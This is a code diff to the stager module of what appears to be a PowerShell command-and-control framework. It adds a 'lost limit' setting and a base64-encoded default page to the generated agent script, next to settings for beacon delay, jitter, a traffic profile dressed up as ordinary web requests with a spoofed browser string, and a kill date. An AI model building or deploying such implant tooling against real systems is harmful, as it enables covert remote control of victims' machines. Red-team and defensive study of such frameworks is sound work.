@@ -10,6 +10,7 @@ import http
 import helpers
 import encryption
 import os
+import base64
 
 
 class Stagers:
@@ -163,24 +164,26 @@ class Stagers:
             return randomizedStager
 
 
-    def generate_agent(self, delay, jitter, profile, killDate, workingHours):
+    def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
         """
         Generate "standard API" functionality, i.e. the actual agent.ps1 that runs.
         
         This should always be sent over encrypted comms.
         """
-
         f = open(self.installPath + "./data/agent/agent.ps1")
         code = f.read()
         f.close()
 
         # strip out comments and blank lines
         code = helpers.strip_powershell_comments(code)
+        b64DefaultPage = base64.b64encode(http.default_page())
 
-        # patch in the delay, jitter, and comms profile
+        # patch in the delay, jitter, lost limit, and comms profile
         code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
         code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
         code = code.replace('$Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
+        code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
+        code = code.replace('$DefaultPage = ""', '$DefaultPage = "'+b64DefaultPage+'"')
 
         # patch in the killDate and workingHours if they're specified
         if killDate != "":
